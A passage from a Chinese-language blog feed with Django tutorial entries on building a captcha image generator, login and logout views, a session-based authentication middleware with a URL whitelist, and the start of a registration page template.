id="2-2-3-图片验证码"><a href="#2-2-3-图片验证码" class="headerlink" title="2.2.3 图片验证码"></a>2.2.3 图片验证码</h4><p>python生成图片参考：<a href="https://www.cnblogs.com/wupeiqi/articles/5812291.html" target="_blank" rel="noopener">https://www.cnblogs.com/wupeiqi/articles/5812291.html</a></p><ul><li>安装 pillow 模块，该模块用于生成图片。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pillow</span><br></pre></td></tr></table></figure><ul><li>构造获取图片验证码的url路径</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url(<span class="string">r'^image/code/$'</span>, account.image_code, name=<span class="string">'image_code'</span>),</span><br></pre></td></tr></table></figure><ul><li>创建<code>image_code.py</code>文件，存放生成验证码图片代码</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> ImageDraw, Image, ImageFont, ImageFilter</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_code</span><span class="params">(width=<span class="number">120</span>, height=<span class="number">30</span>, char_length=<span class="number">5</span>, font_file=<span class="string">'Monaco.ttf'</span>, font_size=<span class="number">28</span>)</span>:</span></span><br><span class="line">    code = []</span><br><span class="line">    img = Image.new(mode=<span class="string">'RGB'</span>, size=(width, height), color=(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">    draw = ImageDraw.Draw(img, mode=<span class="string">'RGB'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">rndChar</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        生成随机字母</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">return</span> chr(random.randint(<span class="number">65</span>, <span class="number">90</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">rndColor</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        生成随机颜色</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">return</span> (random.randint(<span class="number">0</span>, <span class="number">255</span>), random.randint(<span class="number">10</span>, <span class="number">255</span>), random.randint(<span class="number">64</span>, <span class="number">255</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 写文字</span></span><br><span class="line">    font = ImageFont.truetype(font_file, font_size)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(char_length):</span><br><span class="line">        char = rndChar()</span><br><span class="line">        code.append(char)</span><br><span class="line">        h = random.randint(<span class="number">0</span>, <span class="number">4</span>)</span><br><span class="line">        draw.text([i * width / char_length, h], char, font=font, fill=rndColor())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 写干扰点</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">40</span>):</span><br><span class="line">        draw.point([random.randint(<span class="number">0</span>, width), random.randint(<span class="number">0</span>, height)], fill=rndColor())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 写干扰圆圈</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">40</span>):</span><br><span class="line">        draw.point([random.randint(<span class="number">0</span>, width), random.randint(<span class="number">0</span>, height)], fill=rndColor())</span><br><span class="line">        x = random.randint(<span class="number">0</span>, width)</span><br><span class="line">        y = random.randint(<span class="number">0</span>, height)</span><br><span class="line">        draw.arc((x, y, x + <span class="number">4</span>, y + <span class="number">4</span>), <span class="number">0</span>, <span class="number">90</span>, fill=rndColor())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 画干扰线</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        x1 = random.randint(<span class="number">0</span>, width)</span><br><span class="line">        y1 = random.randint(<span class="number">0</span>, height)</span><br><span class="line">        x2 = random.randint(<span class="number">0</span>, width)</span><br><span class="line">        y2 = random.randint(<span class="number">0</span>, height)</span><br><span class="line"></span><br><span class="line">        draw.line((x1, y1, x2, y2), fill=rndColor())</span><br><span class="line"></span><br><span class="line">    img = img.filter(ImageFilter.EDGE_ENHANCE_MORE)</span><br><span class="line">    <span class="keyword">return</span> img, <span class="string">''</span>.join(code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    image_obj, code = check_code()</span><br><span class="line">    <span class="comment"># print(code)</span></span><br><span class="line">    <span class="comment"># 图片写到文件中</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    with open('code.png','wb') as f:</span></span><br><span class="line"><span class="string">        image_obj.save(f,format='png')</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 把图片内容写到内存 stream</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    from io import BytesIO</span></span><br><span class="line"><span class="string">    stream = BytesIO()</span></span><br><span class="line"><span class="string">    image_obj.save(stream, 'png')</span></span><br><span class="line"><span class="string">    stream.getvalue()</span></span><br><span class="line"><span class="string">    '''</span></span><br></pre></td></tr></table></figure><ul><li>视图函数引用上面的代码生成图片验证码</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">image_code</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="string">"""生成图片验证码"""</span></span><br><span class="line">    <span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line">    <span class="keyword">from</span> utils.image_code <span class="keyword">import</span> check_code</span><br><span class="line">    img_obj, code = check_code()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 把生成的code写入到session中</span></span><br><span class="line">    request.session[<span class="string">'image_code'</span>] = code</span><br><span class="line">    request.session.set_expiry(<span class="number">60</span>)  <span class="comment"># 主动修改session的值过期时间为60秒</span></span><br><span class="line">    </span><br><span class="line">    <span class="string">""" 将图片内容写到内存中 """</span></span><br><span class="line">    stream = BytesIO()</span><br><span class="line">    img_obj.save(stream, <span class="string">'png'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(stream.getvalue())</span><br></pre></td></tr></table></figure><h4 id="2-2-4-点击更换"><a href="#2-2-4-点击更换" class="headerlink" title="2.2.4 点击更换"></a>2.2.4 点击更换</h4><p>给图片标签绑定事件，点击更换验证码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        $(<span class="string">'#imageCode'</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> oldSrc = $(<span class="keyword">this</span>).attr(<span class="string">'src'</span>);</span></span><br><span class="line"><span class="javascript">            $(<span class="keyword">this</span>).attr(<span class="string">'src'</span>, oldSrc + <span class="string">'?'</span>);</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-2-5-登陆"><a href="#2-2-5-登陆" class="headerlink" title="2.2.5 登陆"></a>2.2.5 登陆</h4><p>通过form标签发送post请求，后台进行校验，后台通过form表单的<code>is_valid()方法</code>进行校验</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="string">"""用户名密码登陆"""</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        form = LoginForm(request)</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">'web/login.html'</span>, &#123;<span class="string">'form'</span>: form&#125;)</span><br><span class="line">    form = LoginForm(request, data=request.POST)</span><br><span class="line">    <span class="keyword">if</span> form.is_valid():</span><br><span class="line">        username = form.cleaned_data[<span class="string">'username'</span>]</span><br><span class="line">        password = form.cleaned_data[<span class="string">'password'</span>]</span><br><span class="line">        <span class="comment"># user_obj = models.UserInfo.objects.filter(username=username,password=password).first()</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">from</span> django.db.models <span class="keyword">import</span> Q</span><br><span class="line">        user_obj = models.UserInfo.objects.filter(Q(email=username) | Q(mobile_phone=username)).filter(</span><br><span class="line">            password=password).first()</span><br><span class="line">        <span class="keyword">if</span> user_obj:</span><br><span class="line">            <span class="comment"># 用户信息放入session</span></span><br><span class="line">            request.session[<span class="string">'username'</span>] = user_obj.username</span><br><span class="line">            request.session[<span class="string">'user_id'</span>] = user_obj.pk</span><br><span class="line">            request.session.set_expiry(<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 用户名密码正确</span></span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">'index'</span>)</span><br><span class="line">        form.add_error(<span class="string">'username'</span>, <span class="string">'用户名或密码错误'</span>)</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">'web/login.html'</span>, &#123;<span class="string">'form'</span>: form&#125;)</span><br></pre></td></tr></table></figure><h2 id="3-退出登录"><a href="#3-退出登录" class="headerlink" title="3 退出登录"></a>3 退出登录</h2><p>在urls.py文件下构造退出登录路径</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 退出登录</span></span><br><span class="line">url(<span class="string">r'^logout/$'</span>, account.logout, name=<span class="string">'logout'</span>),</span><br></pre></td></tr></table></figure><p>后端代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">(request)</span>:</span></span><br><span class="line">    request.session.flush()</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">'index'</span>)</span><br></pre></td></tr></table></figure><h2 id="4-中间件记录登陆成功状态"><a href="#4-中间件记录登陆成功状态" class="headerlink" title="4 中间件记录登陆成功状态"></a>4 中间件记录登陆成功状态</h2><p>在项目的应用下创建<code>middleware文件夹</code>用于存放中间键的相关代码</p><p>在该文件夹下创建<code>auth.py</code>文件，存放登录状态的代码。</p><h3 id="4-1-在settings-py设置白名单"><a href="#4-1-在settings-py设置白名单" class="headerlink" title="4.1 在settings.py设置白名单"></a>4.1 在settings.py设置白名单</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ####### 登陆白名单：无需登陆可以访问的页面 #########</span></span><br><span class="line">WHITE_REGEX_URL_LIST = [</span><br><span class="line">    <span class="string">"/register/"</span>,</span><br><span class="line">    <span class="string">"/login/sms/"</span>,</span><br><span class="line">    <span class="string">"/login/"</span>,</span><br><span class="line">    <span class="string">"/image/code/"</span>,</span><br><span class="line">    <span class="string">"/send/sms/"</span>,</span><br><span class="line">    <span class="string">"/index/"</span>,</span><br><span class="line">    <span class="string">"/resetpassword/"</span>,</span><br><span class="line">    <span class="string">"/price/"</span>,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="4-2-判断是否登录，或者访问的页面是否在白名单中"><a href="#4-2-判断是否登录，或者访问的页面是否在白名单中" class="headerlink" title="4.2 判断是否登录，或者访问的页面是否在白名单中"></a>4.2 判断是否登录，或者访问的页面是否在白名单中</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.utils.deprecation <span class="keyword">import</span> MiddlewareMixin</span><br><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> redirect</span><br><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"><span class="keyword">from</span> web <span class="keyword">import</span> models</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tracer</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.user = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AuthMiddleware</span><span class="params">(MiddlewareMixin)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_request</span><span class="params">(self, request)</span>:</span></span><br><span class="line"></span><br><span class="line">        request.tracer = Tracer()</span><br><span class="line"></span><br><span class="line">        <span class="string">"""用户已登陆，则request中赋值"""</span></span><br><span class="line">        user_id = request.session.get(<span class="string">'user_id'</span>, <span class="number">0</span>)</span><br><span class="line">        user_obj = models.UserInfo.objects.filter(id=user_id).first()</span><br><span class="line">        request.tracer.user = user_obj</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 白名单：没有登陆可以访问的页面</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        1. 获取当前用户访问的URL</span></span><br><span class="line"><span class="string">        2. 检查URL是否在白名单中，如果不在，判断是否登录，没有登陆跳转到登录页面             </span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> request.path_info <span class="keyword">in</span> settings.WHITE_REGEX_URL_LIST:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="comment"># 检测用户是否登录，已登录继续往下执行，为登陆返回登陆页面</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> request.tracer.user:</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">'login'</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 实现登陆 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>实现注册</title>
      <link href="/2020/08/02/1%20%E6%B3%A8%E5%86%8C/"/>
      <url>/2020/08/02/1%20%E6%B3%A8%E5%86%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="1-实现注册"><a href="#1-实现注册" class="headerlink" title="1 实现注册"></a>1 实现注册</h2><h3 id="1-1-构造注册url路径信息"><a href="#1-1-构造注册url路径信息" class="headerlink" title="1.1 构造注册url路径信息"></a>1.1 构造注册url路径信息</h3><p>在<code>urls.py</code>文件下，构造注册路径</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url(<span class="string">r'^register/$'</span>, account.register, name=<span class="string">'register'</span>),</span><br></pre></td></tr></table></figure><h3 id="1-2-注册页面的展示"><a href="#1-2-注册页面的展示" class="headerlink" title="1.2 注册页面的展示"></a>1.2 注册页面的展示</h3><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Django%E5%9B%BE%E7%89%87/%E6%B3%A8%E5%86%8C%E9%A1%B5%E9%9D%A2.jpg"  alt="注册页面"></p><h3 id="1-3-由前期准备后创建web应用"><a href="#1-3-由前期准备后创建web应用" class="headerlink" title="1.3 由前期准备后创建web应用"></a>1.3 由前期准备后创建web应用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python manage.py startapp web</span><br></pre></td></tr></table></figure><p>在setting中注册该应用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MIDDLEWARE = [</span><br><span class="line">......</span><br><span class="line">    <span class="string">'web.middleware.auth.AuthMiddleware'</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="1-4-模板路径处理"><a href="#1-4-模板路径处理" class="headerlink" title="1.4 模板路径处理"></a>1.4 模板路径处理</h3><p>根目录templates -&gt; 根据app注册顺序去每个app的templates中</p><p>在web应用中创建templates文件夹存放html模板。</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Django%E5%9B%BE%E7%89%87/%E6%A8%A1%E6%9D%BF%E8%B7%AF%E5%BE%84%E5%A4%84%E7%90%86.jpg"  alt="模板路径处理"></p><h3 id="1-5-母版准备"><a href="#1-5-母版准备" class="headerlink" title="1.5 母版准备"></a>1.5 母版准备</h3><p>在<code>web应用</code>下的<code>templates</code>下创建<code>layout文件夹</code>用来存放公共模板。</p><p>通过以下代码创建母版</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% block title %&#125;&#123;% endblock %&#125;</span><br><span class="line">&#123;% block css %&#125;&#123;% endblock %&#125;</span><br><span class="line">&#123;% block content %&#125;&#123;% endblock %&#125;</span><br><span class="line">&#123;% block js %&#125;&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p><code>basic.html</code>文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&#123;% load static %&#125;</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;% block title %&#125;&#123;% endblock %&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"&#123;% static 'plugin/bootstrap/css/bootstrap.min.css' %&#125;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"&#123;% static 'plugin/font-awesome/css/font-awesome.min.css' %&#125;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.navbar-default</span>&#123;</span></span><br><span class="line">            border-radius: 0;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    &#123;% block css %&#125;&#123;% endblock %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">"navbar navbar-default"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- Brand and toggle get grouped for better mobile display --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"navbar-header"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"navbar-toggle collapsed"</span> <span class="attr">data-toggle</span>=<span class="string">"collapse"</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">data-target</span>=<span class="string">"#bs-example-navbar-collapse-1"</span> <span class="attr">aria-expanded</span>=<span class="string">"false"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"sr-only"</span>&gt;</span>Toggle navigation<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"navbar-brand"</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'index' %&#125;"</span>&gt;</span>Tracer平台<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- Collect the nav links, forms, and other content for toggling --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"collapse navbar-collapse"</span> <span class="attr">id</span>=<span class="string">"bs-example-navbar-collapse-1"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"nav navbar-nav"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>产品功能<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>企业方案<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>帮助文档<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'price' %&#125;"</span>&gt;</span>价格<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"nav navbar-nav navbar-right"</span>&gt;</span></span><br><span class="line">                &#123;% if request.tracer.user %&#125;</span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"dropdown"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">class</span>=<span class="string">"dropdown-toggle"</span> <span class="attr">data-toggle</span>=<span class="string">"dropdown"</span> <span class="attr">role</span>=<span class="string">"button"</span> <span class="attr">aria-haspopup</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">                       <span class="attr">aria-expanded</span>=<span class="string">"false"</span>&gt;</span>&#123;&#123; request.tracer.user.username &#125;&#125; <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"caret"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"dropdown-menu"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'project_list' %&#125;"</span>&gt;</span>管理中心<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                        <span 